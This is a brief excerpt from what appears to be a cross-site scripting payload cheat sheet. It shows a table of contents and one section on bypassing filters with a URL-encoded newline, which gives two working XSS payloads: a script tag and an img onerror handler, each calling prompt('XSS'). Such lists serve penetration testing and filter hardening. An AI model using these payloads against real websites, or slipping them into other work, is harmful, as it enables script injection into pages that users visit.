...
- [Cross Site Scripting](#cross-site-scripting)
  ...
  - [Filter Bypass and exotic payloads](#filter-bypass-and-exotic-payloads)
    ...
    - [Bypass using url-encoded newline](#bypass-using-url-encoded-newline)
...
### Bypass using url-encoded newline  

```javascript
x%0A<script>prompt('XSS')</script>
x%0A<img src=x onerror=prompt('XSS')>
```
